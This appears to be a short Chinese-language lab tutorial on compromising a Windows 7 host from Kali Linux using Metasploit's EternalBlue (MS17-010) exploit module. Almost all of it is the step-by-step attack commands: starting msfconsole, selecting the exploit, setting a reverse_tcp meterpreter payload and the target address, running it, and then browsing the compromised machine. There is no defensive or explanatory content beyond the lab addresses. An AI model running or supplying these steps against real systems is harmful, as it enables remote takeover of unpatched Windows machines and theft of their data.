一、环境介绍

小受：192.168.139.129 win7

小攻：192.168.139.133 Kali

二、启动MSF

1、切换root模式

sudo su

2、启动msfconsole

3、选择攻击模块

use exploit/windows/smb/ms17_010_eternalblue

4、选择payload

set payload windows/x64/meterpreter/reverse_tcp

5、设置目标地址

set rhosts 192.168.139.129

6、查看是否设置其他参数

show options

7、开始攻击

run

8、攻击成功，可以查询对方ip，查看当前目录pwd
